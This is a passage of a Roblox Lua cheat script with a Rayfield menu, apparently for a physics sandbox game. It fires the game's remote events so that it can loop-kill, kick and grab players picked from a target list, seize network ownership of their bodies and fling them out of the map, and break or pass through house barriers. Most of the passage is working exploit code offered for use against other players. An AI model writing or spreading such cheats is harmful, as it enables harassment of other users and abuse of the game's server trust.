            task.wait(0.2)
            blobmanInstanceS = inv and inv:FindFirstChild("CreatureBlobman")
            tries = tries + 1
        until blobmanInstanceS or tries > 25
    end
end
 
local function BlobGrab(blob, target, side)
    if not blob or not target then return end
    local detector = blob:FindFirstChild(side.."Detector")
    if not detector then return end
    local weld = detector:FindFirstChild(side.."Weld")
    if not weld then return end
 
    local script = blob:FindFirstChild("BlobmanSeatAndOwnerScript")
    if script and script:FindFirstChild("CreatureGrab") then
        pcall(function()
            script.CreatureGrab:FireServer(detector, target, weld)
        end)
    end
end
 
local function BlobRelease(blob, target, side)
    if not blob or not target then return end
    local detector = blob:FindFirstChild(side.."Detector")
    if not detector then return end
    local weld = detector:FindFirstChild(side.."Weld")
    if not weld then return end
 
    local script = blob:FindFirstChild("BlobmanSeatAndOwnerScript")
    if script and script:FindFirstChild("CreatureRelease") then
        pcall(function()
            script.CreatureRelease:FireServer(weld, target)
        end)
    end
end
 
local function BlobDrop(blob, target, side)
    if not blob or not target then return end
    local detector = blob:FindFirstChild(side.."Detector")
    if not detector then return end
    local weld = detector:FindFirstChild(side.."Weld")
    if not weld then return end
 
    local script = blob:FindFirstChild("BlobmanSeatAndOwnerScript")
    if script and script:FindFirstChild("CreatureDrop") then
        pcall(function()
            script.CreatureDrop:FireServer(weld, target)
        end)
    end
end
 
local function BlobMassless(blob, target, side)
    if not blob or not target then return end
    local char = plr.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
 
    local detector = blob:FindFirstChild(side.."Detector")
    if not detector then return end
    local weld = detector:FindFirstChild(side.."Weld")
    if not weld then return end
 
    local script = blob:FindFirstChild("BlobmanSeatAndOwnerScript")
    if script then
        pcall(function()
            if script:FindFirstChild("CreatureGrab") then
                script.CreatureGrab:FireServer(detector, hrp, weld)
                task.wait(0.1)
                script.CreatureGrab:FireServer(detector, target, weld)
                task.wait(0.1)
                if script:FindFirstChild("CreatureDrop") then
                    script.CreatureDrop:FireServer(weld, target)
                end
            end
        end)
    end
end
 
-- =============================================
-- [ Blob attack function ]
-- =============================================
local function BlobAttackAll(mode)
    UpdateCurrentBlobman()
    if not currentBlobS then
        Rayfield:Notify({Title = "Blob", Content = "You must be riding a Blob", Duration = 2})
        return
    end
 
    local count = 0
    for _, targetName in ipairs(playersInLoop1V) do
        local player = Players:FindFirstChild(targetName)
        if player and player.Character then
            local hrp = player.Character:FindFirstChild("HumanoidRootPart")
            if hrp then
                if mode == "kill" then
                    BlobGrab(currentBlobS, hrp, "Right")
                    task.wait(0.1)
                    BlobRelease(currentBlobS, hrp, "Right")
                elseif mode == "massless" then
                    BlobMassless(currentBlobS, hrp, "Right")
                elseif mode == "grab" then
                    BlobGrab(currentBlobS, hrp, "Right")
                elseif mode == "release" then
                    BlobRelease(currentBlobS, hrp, "Right")
                elseif mode == "drop" then
                    BlobDrop(currentBlobS, hrp, "Right")
                end
                count = count + 1
            end
        end
        task.wait(0.1)
    end
 
    local modeNames = {kill="Kill", massless="Massless", grab="Grab", release="Release", drop="Drop"}
    Rayfield:Notify({Title = "Blob " .. modeNames[mode], Content = count .. " people processed", Duration = 2})
end
 
-- =============================================
-- [ Blob loop kill ]
-- =============================================
local function rawBlobLoopKill()
    UpdateCurrentBlobman()
 
    local seat = plr.Character
        and plr.Character:FindFirstChildOfClass("Humanoid")
        and plr.Character:FindFirstChildOfClass("Humanoid").SeatPart
 
    if not (seat and seat.Parent and seat.Parent.Name == "CreatureBlobman") then
        Rayfield:Notify({Title = "Blob kill", Content = "Please mount Blob", Duration = 2})
        return false
    end
 
    if blobKillThread then
        task.cancel(blobKillThread)
        blobKillThread = nil
    end
 
    blobKillThread = task.spawn(function()
        while blobLoopT3 do
            for _, name in ipairs(playersInLoop1V) do
                if not blobLoopT3 then break end
 
                local player = Players:FindFirstChild(name)
                if not player then continue end
 
                local char = player.Character
                if not char then continue end
 
                local hrp = char:FindFirstChild("HumanoidRootPart")
                if not hrp then continue end
 
                for i = 1, 5 do
                    if not blobLoopT3 then break end
 
                    pcall(function()
                        BlobGrab(currentBlobS, hrp, "Right")
                    end)
                    task.wait(0.1)
 
                    pcall(function()
                        BlobRelease(currentBlobS, hrp, "Right")
                    end)
                    task.wait(0.1)
                end
 
                task.wait(0.2)
            end
            task.wait(0.3)
        end
    end)
    return true
end
 
-- =============================================
-- [ Blob loop kick ]
-- =============================================
local function rawBlobLoopKick()
    UpdateCurrentBlobman()
 
    local seat = plr.Character and plr.Character:FindFirstChildOfClass("Humanoid") and plr.Character:FindFirstChildOfClass("Humanoid").SeatPart
    if not (seat and seat.Parent and seat.Parent.Name == "CreatureBlobman") then
        Rayfield:Notify({Title = "Blob kick", Content = "Please mount Blob", Duration = 2})
        return false
    end
 
    if blobKickThread then
        task.cancel(blobKickThread)
        blobKickThread = nil
    end
 
    blobKickThread = task.spawn(function()
        while blobLoopT do
            for _, name in ipairs(playersInLoop1V) do
                if not blobLoopT then break end
 
                local player = Players:FindFirstChild(name)
                if not player then continue end
 
                local char = player.Character
                if not char then continue end
 
                local hrp = char:FindFirstChild("HumanoidRootPart")
                if not hrp then continue end
 
                pcall(function()
                    BlobGrab(currentBlobS, hrp, "Right")
                end)
                task.wait(0.15)
 
                pcall(function()
                    BlobRelease(currentBlobS, hrp, "Right")
                end)
                task.wait(0.15)
            end
            task.wait(0.3)
        end
    end)
    return true
end
 
-- =============================================
-- [ Anti massless function ]
-- =============================================
local function AntiMasslessF()
    if antiMasslessThread then
        task.cancel(antiMasslessThread)
        antiMasslessThread = nil
    end
 
    if not antiMasslessEnabled then return end
 
    antiMasslessThread = task.spawn(function()
        while antiMasslessEnabled do
            local char = plr.Character
            if char then
                for _, part in ipairs(char:GetDescendants()) do
                    if part:IsA("BasePart") and part.Massless == true then
                        part.Massless = false
                    end
                end
            end
            task.wait(0.1)
        end
    end)
end
 
-- =============================================
-- [ Show PCLD function ]
-- =============================================
local pcldViewEnabled = false
local pcldBoxes = {}
 
local function togglePcldView(enable)
    if enable then
        for _, box in pairs(pcldBoxes) do
            pcall(function() box:Destroy() end)
        end
        pcldBoxes = {}
 
        for _, obj in ipairs(Workspace:GetChildren()) do
            if obj.Name == "PlayerCharacterLocationDetector" and obj:IsA("BasePart") then
                local box = Instance.new("SelectionBox")
                box.Adornee = obj
                box.LineThickness = 0.05
                box.Color3 = Color3.fromRGB(255, 0, 0)
                box.SurfaceColor3 = Color3.fromRGB(255, 255, 255)
                box.SurfaceTransparency = 0.5
                box.Visible = true
                box.Parent = obj
                pcldBoxes[obj] = box
            end
        end
 
        workspace.DescendantAdded:Connect(function(obj)
            if pcldViewEnabled and obj.Name == "PlayerCharacterLocationDetector" and obj:IsA("BasePart") then
                task.wait(0.1)
                local box = Instance.new("SelectionBox")
                box.Adornee = obj
                box.LineThickness = 0.05
                box.Color3 = Color3.fromRGB(255, 0, 0)
                box.SurfaceColor3 = Color3.fromRGB(255, 255, 255)
                box.SurfaceTransparency = 0.5
                box.Visible = true
                box.Parent = obj
                pcldBoxes[obj] = box
            end
        end)
    else
        for _, box in pairs(pcldBoxes) do
            pcall(function() box:Destroy() end)
        end
        pcldBoxes = {}
    end
end
 
-- =============================================
-- [ Barrier Noclip function ]
-- =============================================
local BarrierCanCollideT = false
 
local function BarrierCanCollideF()
    if BarrierCanCollideT then
        for i = 1, 5 do
            local plot = Plots:FindFirstChild("Plot"..i)
            if plot and plot:FindFirstChild("Barrier") then
                for _, barrier in ipairs(plot.Barrier:GetChildren()) do
                    if barrier:IsA("BasePart") then
                        barrier.CanCollide = false
                    end
                end
            end
        end
    else
        for i = 1, 5 do
            local plot = Plots:FindFirstChild("Plot"..i)
            if plot and plot:FindFirstChild("Barrier") then
                for _, barrier in ipairs(plot.Barrier:GetChildren()) do
                    if barrier:IsA("BasePart") then
                        barrier.CanCollide = true
                    end
                end
            end
        end
    end
end
 
-- =============================================
-- [ Plot Barrier Delete function ]
-- =============================================
local PBDrun = false
 
local function PlotBarrierDelete()
    if PBDrun then 
        Rayfield:Notify({Title = "Barrier", Content = "Already executing", Duration = 2})
        return 
    end
    PBDrun = true
 
    local char = plr.Character
    if not char then 
        PBDrun = false 
        Rayfield:Notify({Title = "Error", Content = "No character", Duration = 2})
        return 
    end
 
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then 
        PBDrun = false 
        Rayfield:Notify({Title = "Error", Content = "No HumanoidRootPart", Duration = 2})
        return 
    end
 
    local metal = nil
    local plot1 = Workspace:FindFirstChild("Plots") and Workspace.Plots:FindFirstChild("Plot1")
    if plot1 then
        local teslaCoil = plot1:FindFirstChild("TeslaCoil")
        if teslaCoil then
            metal = teslaCoil:FindFirstChild("Metal")
        end
    end
 
    if not metal then
        PBDrun = false
        Rayfield:Notify({Title = "Error", Content = "Cannot find Metal part", Duration = 2})
        return
    end
 
    local TP = metal.CFrame
    local OCF = hrp.CFrame
 
    task.spawn(function()
        if SpawnToyRemote then
            pcall(function()
                SpawnToyRemote:InvokeServer("FoodBread", hrp.CFrame, Vector3.new(0,0,0))
            end)
        end
    end)
 
    task.wait(0.2)
 
    local foodBread = inv and inv:FindFirstChild("FoodBread")
    if not foodBread then 
        PBDrun = false 
        Rayfield:Notify({Title = "Error", Content = "Bread spawn failed", Duration = 2})
        return 
    end
 
    if foodBread then
        task.spawn(function()
            local holdPart = foodBread:FindFirstChild("HoldPart")
            if holdPart then
                local holdRemote = holdPart:FindFirstChild("HoldItemRemoteFunction")
                if holdRemote then
                    pcall(function()
                        holdRemote:InvokeServer(foodBread, char)
                    end)
                end
            end
        end)
    end
 
    task.wait(0.1)
    hrp.CFrame = TP
    task.wait(0.17)
 
    if foodBread and DestroyToy then
        pcall(function()
            DestroyToy:FireServer(foodBread)
        end)
    end
 
    hrp.CFrame = OCF
    task.wait(0.4)
 
    PBDrun = false
    Rayfield:Notify({Title = "✅ Barrier", Content = "Destruction complete", Duration = 2})
end
 
-- =============================================
-- [ Manual kill function ]
-- =============================================
local targetList = {}
 
local function manualKill(mode)
    local char = plr.Character
    if not char then 
        Rayfield:Notify({Title = "Error", Content = "No character", Duration = 2})
        return 
    end
 
    local count = 0
    for _, targetName in ipairs(targetList) do
        local target = Players:FindFirstChild(targetName)
        if target and target.Character then
            local torso = target.Character:FindFirstChild("Torso") or target.Character:FindFirstChild("HumanoidRootPart")
            if torso then
                pcall(function() SetNetworkOwner:FireServer(torso, torso.CFrame) end)
 
                if mode == "kill" then
                    local FallenY = Workspace.FallenPartsDestroyHeight
                    local targetY = (FallenY <= -50000 and -49999) or (FallenY <= -100 and -99) or -100
                    pcall(function() torso.CFrame = CFrame.new(99999, targetY, 99999) end)
                else
                    pcall(function() torso.CFrame = CFrame.new(99999, 99999, 99999) end)
                end
                count = count + 1
            end
        end
        task.wait(0.1)
    end
 
    Rayfield:Notify({Title = mode == "kill" and "Kill" or "Kick", Content = count .. " people processed", Duration = 2})
end
 
-- =============================================
-- [ Immediate release function ]
-- =============================================
local function ManualRelease()
    local char = plr.Character
    if not char then 
        Rayfield:Notify({Title = "Error", Content = "No character", Duration = 2})
        return 
    end
 
    if DestroyGrabLine then
        local grabParts = Workspace:FindFirstChild("GrabParts")
        if grabParts then
            for _, part in ipairs(grabParts:GetChildren()) do
                if part.Name == "GrabPart" then
                    local weld = part:FindFirstChildOfClass("WeldConstraint")
                    if weld and weld.Part1 and weld.Part1:IsDescendantOf(char) then
                        pcall(function() DestroyGrabLine:FireServer(weld.Part1) end)
                    end
                end
            end
        end
    end
 
    if SetNetworkOwner then
        local hrp = char:FindFirstChild("HumanoidRootPart")
        if hrp then pcall(function() SetNetworkOwner:FireServer(hrp) end) end
    end
 
    if Struggle then pcall(function() Struggle:FireServer() end) end
 
    Rayfield:Notify({Title = "Release complete", Duration = 2})
end
 
-- =============================================
-- [ Auto-Gucci function ]
-- =============================================
local function ragdollLoopF()
    if ragdollLoopD then return end
    ragdollLoopD = true
 
    while sitJumpT do
        local char = plr.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        if char and hrp and RagdollRemote then
            RagdollRemote:FireServer(hrp, 0)
        end
        task.wait()
    end
    ragdollLoopD = false
end
 
local function sitJumpF()
    local char = plr.Character
    local hum = char and char:FindFirstChild("Humanoid")
    if not char or not hum then return end
    local seat = blobmanInstanceS and blobmanInstanceS:FindFirstChildWhichIsA("VehicleSeat")
    if seat and seat.Occupant ~= hum then
        seat:Sit(hum)
        AutoGucciT = false
        sitJumpT = false
    end
end
 
local function AutoGucciF()
    while AutoGucciT do
        local success = pcall(function()
            spawnBlobmanF()
 
            local char = plr.Character
            if not char then
                task.wait(0.1)
                return 
            end
 
            local hrp = char:WaitForChild("HumanoidRootPart")
            local hum = char:WaitForChild("Humanoid")
            local rag = hum:WaitForChild("Ragdolled")
            local held = plr:WaitForChild("IsHeld")
 
            if not hrp then return end
            local OCF = hrp.CFrame
 
            if not sitJumpT then
                task.spawn(sitJumpF)
                sitJumpT = true
            end
 
            task.spawn(ragdollLoopF)
            task.wait(0.3)
            hrp.CFrame = OCF
 
            local successCheck = true
            sitJumpT = false
            if RagdollRemote then RagdollRemote:FireServer(hrp, 0.001) end
 
            while successCheck and AutoGucciT do
                if hum.Health <= 0 then
                    if blobmanInstanceS and DestroyToy then
                        DestroyToy:FireServer(blobmanInstanceS)
                    end
                    successCheck = false
                    break
                end
 
                local seat = blobmanInstanceS and blobmanInstanceS:FindFirstChildWhichIsA("VehicleSeat")
                if seat and seat.Occupant ~= nil then
                    if DestroyToy then DestroyToy:FireServer(blobmanInstanceS) end
                    successCheck = false
                    break
                end
 
                if rag.Value == true or held.Value == true then
                    while (rag.Value == true or held.Value == true) and AutoGucciT do
                        if Struggle then Struggle:FireServer() end
                        task.wait()
                    end
                    successCheck = false
                    break
                end
 
                local blobHRP = blobmanInstanceS and blobmanInstanceS:FindFirstChild("HumanoidRootPart")
                if blobHRP then
                    pcall(function() SetNetworkOwner:FireServer(blobHRP, hrp) end)
                    blobHRP.CFrame = CFrame.new(0, 9999, 0)
                end
 
                task.wait()
            end
 
            if not successCheck then
                local blobHRP = blobmanInstanceS and blobmanInstanceS:FindFirstChild("HumanoidRootPart")
                Rayfield:Notify({Title = "Gucci", Content = "Retrying idle...", Duration = 1})
                if hum then
                    if Struggle then Struggle:FireServer(plr) end
                    hum.Sit = true
                    task.wait(0.1)
                    hum.Sit = false
                    if blobHRP and blobHRP.Position.Y > 9000 and DestroyToy then 
                        DestroyToy:FireServer(blobmanInstanceS) 
                    end
                end
                sitJumpT = false
                task.wait(1)
            end
        end)
        task.wait()
    end
end
 
-- =============================================
-- [ Kick notification function ]
-- =============================================
local anchoredCache = {}
local kickNotificationsEnabled = true
 
local function setupKickNotifications()
    Players.PlayerAdded:Connect(function(player)
        player.CharacterAdded:Connect(function(char)
            local hrp = char:WaitForChild("HumanoidRootPart", 1)
            if hrp then
                anchoredCache[player] = false
            end
        end)
    end)
 
    Players.PlayerRemoving:Connect(function(player)
        if anchoredCache[player] == true and kickNotificationsEnabled then
            Rayfield:Notify({
                Title = "👢 Kick Detected",
                Content = string.format("%s (@%s) was kicked", player.DisplayName, player.Name),
                Duration = 5
            })
        end
        anchoredCache[player] = nil
    end)
 
    task.spawn(function()
        while kickNotificationsEnabled do
            for _, player in ipairs(Players:GetPlayers()) do
                if player ~= plr then
                    local char = player.Character
                    if char then
                        local hrp = char:FindFirstChild("HumanoidRootPart")
                        if hrp then
                            anchoredCache[player] = hrp.Anchored == true
                        end
                    end
                end
            end
            task.wait()
        end
    end)
end
 
-- =============================================
-- [ Blob notification function ]
-- =============================================
local blobNotificationsEnabled = true
local notifyCooldowns = {}
local AntiBlobConnection = nil
 
local function CheckBlob(blob, myHRP, myAttach, source)
    local script = blob:FindFirstChild("BlobmanSeatAndOwnerScript")
    if not script then return end
 
    for _, side in ipairs({"Left", "Right"}) do
        local detector = blob:FindFirstChild(side .. "Detector")
        if not detector then continue end
 
        local weld = detector:FindFirstChild(side .. "Weld")
        if weld and weld:IsA("AlignPosition") and weld.Attachment0 == myAttach then
            local msg = source .. " → " .. side .. " Grab"
            local now = tick()
 
            if not notifyCooldowns[msg] or (now - notifyCooldowns[msg]) >= 2 then
                notifyCooldowns[msg] = now
                Rayfield:Notify({
                    Title = "🦠 Blob Detected",
                    Content = msg,
                    Duration = 3
                })
            end
 
            if Struggle then
                pcall(function() Struggle:FireServer() end)
            end
            if RagdollRemote and myHRP then
                pcall(function() RagdollRemote:FireServer(myHRP, 0) end)
            end
        end
    end
end
 
local function setupBlobNotifications()
    if AntiBlobConnection then 
        AntiBlobConnection:Disconnect() 
        AntiBlobConnection = nil
    end
 
    AntiBlobConnection = RunService.Stepped:Connect(function()
        if not blobNotificationsEnabled then 
            if AntiBlobConnection then 
                AntiBlobConnection:Disconnect() 
                AntiBlobConnection = nil
            end
            return 
        end
 
        local myChar = plr.Character
        if not myChar then return end
        local myHRP = myChar:FindFirstChild("HumanoidRootPart")
        local myAttach = myHRP and myHRP:FindFirstChild("RootAttachment")
 
        if not (myHRP and myAttach) then return end
 
        if inv then
            for _, blob in ipairs(inv:GetChildren()) do
                if blob.Name == "CreatureBlobman" then
                    local occupantName = "{me}"
                    local vehicleSeat = blob:FindFirstChild("VehicleSeat")
                    if vehicleSeat and vehicleSeat.Occupant then
                        local character = vehicleSeat.Occupant.Parent
                        if character then
                            local player = Players:GetPlayerFromCharacter(character)
                            if player then occupantName = player.Name end
                        end
                    end
                    CheckBlob(blob, myHRP, myAttach, occupantName)
                end
            end
        end
 
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= plr then
                local invs = Workspace:FindFirstChild(player.Name .. "SpawnedInToys")
                if invs then
                    for _, blob in ipairs(invs:GetChildren()) do
                        if blob.Name == "CreatureBlobman" then
                            local occupantName = player.Name
                            local vehicleSeat = blob:FindFirstChild("VehicleSeat")
                            if vehicleSeat and vehicleSeat.Occupant then
                                local character = vehicleSeat.Occupant.Parent
                                if character then
                                    local occupantPlayer = Players:GetPlayerFromCharacter(character)
                                    if occupantPlayer then occupantName = occupantPlayer.Name end
                                end
                            end
                            CheckBlob(blob, myHRP, myAttach, occupantName)
                        end
                    end
                end
            end
        end
 
        local plots = Workspace:FindFirstChild("PlotItems")
        if plots then
            for i = 1, 5 do
                local plot = plots:FindFirstChild("Plot" .. i)
                if plot then
                    for _, blob in ipairs(plot:GetChildren()) do
                        if blob.Name == "CreatureBlobman" then
                            local occupantName = "Plot " .. i
                            local vehicleSeat = blob:FindFirstChild("VehicleSeat")
                            if vehicleSeat and vehicleSeat.Occupant then
                                local character = vehicleSeat.Occupant.Parent
                                if character then
                                    local player = Players:GetPlayerFromCharacter(character)
                                    if player then occupantName = player.Name end
                                end
                            end
                            CheckBlob(blob, myHRP, myAttach, occupantName)
                        end
                    end
                end
            end
        end
    end)
end
 
-- =============================================
-- [ Create tabs ]
-- =============================================
local MainTab = Window:CreateTab("Main", 4483362458)
local BlobTab = Window:CreateTab("Blob", 4483362458)
local GrabTab = Window:CreateTab("Grab", 4483362458)
local SecurityTab = Window:CreateTab("Security", 4483362458)
local AuraTab = Window:CreateTab("Aura", 4483362458)
local TargetTab = Window:CreateTab("Set Kill Player", 4483362458)
local NotifyTab = Window:CreateTab("🔔 Notification", 4483362458)
local KickGrabTab = Window:CreateTab("👢 KickGrab", 4483362458)
local LoopGrabTab = Window:CreateTab("🔄 LoopGrab", 4483362458)
local KillGrabTab = Window:CreateTab("💀 KillGrab", 4483362458)
local HouseTeleportTab = Window:CreateTab("🏠 House Teleport", 4483362458)
local SettingsTab = Window:CreateTab("Settings", 4483362458)
local GucciTab = Window:CreateTab("House Gucci", 4483362458)
local SetOwnerKickTab = Window:CreateTab("⚡ SetOwnerKick", 4483362458)
 
-- =============================================
-- [ Main Tab - Anti Grab ]
-- =============================================
MainTab:CreateSection("🛡️ Basic Defense")
 
local antiGrabConn = nil
local isvs = false
local RunService = game:GetService("RunService")
 
local function setRagdollF(state)
    local char = plr.Character
    if not char then return end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    local RagdollRemote = rs and rs:FindFirstChild("CharacterEvents") and rs.CharacterEvents:FindFirstChild("RagdollRemote")
    if RagdollRemote then
        RagdollRemote:FireServer(hrp, state and 0 or 1)
    end
end
 
local function AntiGrabF(enable)
    if antiGrabConn then
        antiGrabConn:Disconnect()
        antiGrabConn = nil
    end
 
    if not enable then 
        local char = plr.Character
        if char then
            local hrp = char:FindFirstChild("HumanoidRootPart")
            local hum = char:FindFirstChild("Humanoid")
 
            if hum then
                hum.RequiresNeck = true
            end
 
            if hrp and hrp.Anchored then hrp.Anchored = false end
            if hum then
                hum.Sit = false
                hum:ChangeState(Enum.HumanoidStateType.GettingUp)
            end
        end
        return 
    end
 
    local lastHeldState = false
    local sitHoldTimer = 0
    local shouldKeepSit = false
    local wasHeld = false
    local lastRagdollTime = 0
    local ragdollDuration = 0.48
 
    antiGrabConn = RunService.Heartbeat:Connect(function(deltaTime)
        local char = plr.Character
        if not char then return end
 
        local hum = char:FindFirstChild("Humanoid")
        if not hum then return end
 
        isvs = hum and hum.SeatPart ~= nil
 
        local isHeld = plr:FindFirstChild("IsHeld")
        if not isHeld then return end
 
        local head = char:FindFirstChild("Head")
        local POR = head and head:FindFirstChild("PartOwner")
        local hrp = char:FindFirstChild("HumanoidRootPart")
        local hrp2 = char:FindFirstChild("Torso")
 
        if not hrp or not hum then return end
 
        local FPDH = workspace.FallenPartsDestroyHeight
        local DY = (FPDH <= -50000 and -49999) or (FPDH <= -100 and -99) or -100
        local now = tick()
 
        if hum then
            hum.RequiresNeck = false
            hum.AutoRotate = true
        end
 
        if isvs and POR then
            task.wait(0.3)
        end
 
        if isvs then task.wait(0.3) end
 
        local rag = hum:FindFirstChild("Ragdolled")
        if isHeld.Value == true and rag and rag.Value == true then
            for _, limbName in ipairs({"Head", "Left Arm", "Right Arm", "Left Leg", "Right Leg"}) do
                local limb = char:FindFirstChild(limbName)
                if limb then
                    local ragdollPart = limb:FindFirstChild("RagdollLimbPart")
                    local ragdollCons = limb:FindFirstChild("BallSocketConstraint")
                    if ragdollCons then ragdollCons.Enabled = false end
                    if ragdollPart then ragdollPart.CanCollide = false end
                end
            end
        end
 
        if hum.Health <= 0 then
            lastHeldState = false
            shouldKeepSit = false
            sitHoldTimer = 0
            wasHeld = false
            hum.Sit = false
            hum.AutoRotate = true
        end
 
        if not hrp or hum.Health <= 0 then
            local Struggle = rs and rs:FindFirstChild("CharacterEvents") and rs.CharacterEvents:FindFirstChild("Struggle")
            if Struggle then Struggle:FireServer() end
            if hrp2 then
                hrp2.CFrame = CFrame.new(9999, DY, 9999)
            end
        end
 
        if isHeld.Value == true then
            if hum.MoveDirection.Magnitude > 0 then
                local moveSpeed = 10
                local moveVector = hum.MoveDirection * deltaTime * moveSpeed
 
                hrp.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                hrp.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
 
                moveVector = Vector3.new(moveVector.X, 0, moveVector.Z)
                hrp.CFrame = hrp.CFrame + moveVector
                if hrp2 then hrp2.CFrame = hrp2.CFrame + moveVector end
            end
        end
 
        if isHeld.Value ~= lastHeldState then
            if isHeld.Value == true then
                wasHeld = true
                shouldKeepSit = true
                sitHoldTimer = 0.3
                hum:ChangeState(Enum.HumanoidStateType.RunningNoPhysics)
                hum.Sit = true
                hum.AutoRotate = true
 
                lastRagdollTime = now
                if POR and hrp then
                    local Struggle = rs and rs:FindFirstChild("CharacterEvents") and rs.CharacterEvents:FindFirstChild("Struggle")
                    local RagdollRemote = rs and rs:FindFirstChild("CharacterEvents") and rs.CharacterEvents:FindFirstChild("RagdollRemote")
                    if Struggle then Struggle:FireServer() end
                    if RagdollRemote then RagdollRemote:FireServer(hrp, 0) end
                end
 
                if hrp then
                    setRagdollF(true)
                end
            else
                if wasHeld then
                    shouldKeepSit = true
                    sitHoldTimer = 0.3
                end
            end
            lastHeldState = isHeld.Value
        end
 
        if lastRagdollTime > 0 and now - lastRagdollTime >= ragdollDuration then
            setRagdollF(false)
            lastRagdollTime = 0
        end
 
        if isHeld.Value == true and lastRagdollTime > 0 and now - lastRagdollTime < ragdollDuration then
            if hrp then 
                setRagdollF(true)
            end
        end
 
        if sitHoldTimer > 0 then
            sitHoldTimer = sitHoldTimer - deltaTime
 
            if isHeld.Value == true or POR or (rag and rag.Value == true) then
                shouldKeepSit = true
                sitHoldTimer = 0.3
                hum.Sit = true
                if isHeld.Value == true then
                    hum:ChangeState(Enum.HumanoidStateType.RunningNoPhysics)
                end
            else
                hum.Sit = true
            end
        end
 
        if sitHoldTimer <= 0 and shouldKeepSit then
            local currentRagdolled = hum:FindFirstChild("Ragdolled")
            if not currentRagdolled or currentRagdolled.Value == false then
                hum.Sit = false
                hum:ChangeState(Enum.HumanoidStateType.Running)
                shouldKeepSit = false
                wasHeld = false
            else
                sitHoldTimer = 0.3
            end
        end
 
        if shouldKeepSit then
            hum.Sit = true
        end
 
        if POR then
            local attackerName = POR.Value
            local Struggle = rs and rs:FindFirstChild("CharacterEvents") and rs.CharacterEvents:FindFirstChild("Struggle")
            local RagdollRemote = rs and rs:FindFirstChild("CharacterEvents") and rs.CharacterEvents:FindFirstChild("RagdollRemote")
 
            if Struggle then Struggle:FireServer() end
            if RagdollRemote then RagdollRemote:FireServer(hrp, 0) end
 
            shouldKeepSit = true
            sitHoldTimer = 0.3
            hum.Sit = true
            hum.AutoRotate = true
            lastRagdollTime = now
            if hrp then
                setRagdollF(true)
            end
        end
    end)
end
 
local AntiGrabToggle = MainTab:CreateToggle({
    Name = "⚡ Anti Grab",
    CurrentValue = false,
    Flag = "AntiGrabMainToggle",
    Callback = function(Value)
        local success, err = pcall(function()
            if Value then
                AntiGrabF(true)
                Rayfield:Notify({ Title = "✅ Anti Grab", Content = "Enabled", Duration = 2 })
            else
                AntiGrabF(false)
                Rayfield:Notify({ Title = "❌ Anti Grab", Content = "Disabled", Duration = 2 })
            end
        end)
 
        if not success then
            print("⚠️ Anti Grab Error:", err)
            Rayfield:Notify({ Title = "⚠️ Error", Content = "Anti Grab Function Error", Duration = 2 })
        end
    end
})
 
task.spawn(function()
    task.wait(2)
    AntiGrabF(true)
    AntiGrabToggle:Set(true)
end)
 
MainTab:CreateButton({
    Name = "🔓 Do Not Use",
    Flag = "ManualReleaseButton",
    Callback = function()
        pcall(function() ManualRelease() end)
    end
})
 
local PcldViewToggle = MainTab:CreateToggle({
    Name = "👁️ Show PCLD",
    CurrentValue = false,
    Flag = "PcldViewToggle",
    Callback = function(Value)
        pcall(function()
            pcldViewEnabled = Value
            togglePcldView(Value)
        end)
    end
})
 
local BarrierNoclipToggle = MainTab:CreateToggle({
    Name = "🧱 Barrier Noclip",
    CurrentValue = false,
    Flag = "BarrierNoclipToggle",
    Callback = function(Value)
        pcall(function()
            BarrierCanCollideT = Value
            BarrierCanCollideF()
        end)
    end
})
 
MainTab:CreateButton({
    Name = "💥 Break House Barrier",
    Flag = "PlotBarrierDeleteButton",
    Callback = function()
        pcall(function() PlotBarrierDelete() end)
    end
})
 
local AntiPCLDToggle = MainTab:CreateToggle({
    Name = "🛡️ Anti Kick",
    CurrentValue = false,
    Flag = "AntiPCLDToggle",
    Callback = function(Value)
        pcall(function()
            AntiPCLDEnabled = Value
            if Value then
                setupAntiPCLD()
                Rayfield:Notify({Title = "AntiKick", Content = "Enabled", Duration = 2})
            else
                Rayfield:Notify({Title = "AntiKick", Content = "Disabled", Duration = 2})
            end
        end)
    end
})
 
-- =============================================
-- [ Blob Tab ]
-- =============================================
BlobTab:CreateSection("🦠 Blob Target")
 
local BlobTargetDropdown = BlobTab:CreateDropdown({
    Name = "List",
    Options = playersInLoop1V,
    CurrentOption = {"Open"},
    MultipleOptions = true,
    Flag = "BlobTargetDropdown",
    Callback = function(Options)
        playersInLoop1V = Options
    end
})
 
BlobTab:CreateInput({
    Name = "Add",
    PlaceholderText = "Enter nickname",
    RemoveTextAfterFocusLost = true,
    Callback = function(Value)
        if not Value or Value == "" then return end
 
        local target = findPlayerByPartialName(Value)
        if not target then
            Rayfield:Notify({Title = "Blob", Content = "Player not found", Duration = 2})
            return
        end
 
        for _, name in ipairs(playersInLoop1V) do
            if name == target.Name then
                Rayfield:Notify({Title = "Blob", Content = "Already in list", Duration = 2})
                return
            end
        end
 
        table.insert(playersInLoop1V, target.Name)
        BlobTargetDropdown:Refresh(playersInLoop1V, true)
        Rayfield:Notify({Title = "Blob", Content = "Add: " .. target.Name, Duration = 2})
    end
})
 
BlobTab:CreateInput({
    Name = "Remove",
    PlaceholderText = "Enter nickname",
    RemoveTextAfterFocusLost = true,
    Callback = function(Value)
        if not Value or Value == "" then return end
 
        for i, name in ipairs(playersInLoop1V) do
            if name:lower() == Value:lower() then
                table.remove(playersInLoop1V, i)
                BlobTargetDropdown:Refresh(playersInLoop1V, true)
                Rayfield:Notify({Title = "Blob", Content = "Remove: " .. name, Duration = 2})
                return
            end
        end
        Rayfield:Notify({Title = "Blob", Content = "Name not found", Duration = 2})
    end
})
 
BlobTab:CreateSection("🦠 Blob Control")
 
BlobTab:CreateButton({
    Name = "🪑 Blob Sit",
    Callback = function()
        local char = plr.Character
        if not char then return end
        local humanoid = char:FindFirstChildOfClass("Humanoid")
        if not humanoid then return end
 
        local myBlob = inv and inv:FindFirstChild("CreatureBlobman")
        if myBlob then
            local seat = myBlob:FindFirstChildOfClass("VehicleSeat")
            if seat and seat.Occupant == nil then
                seat:Sit(humanoid)
                Rayfield:Notify({Title = "Blob", Content = "Sit successful", Duration = 2})
            end
        else
            spawnBlobmanF()
            task.wait(0.5)
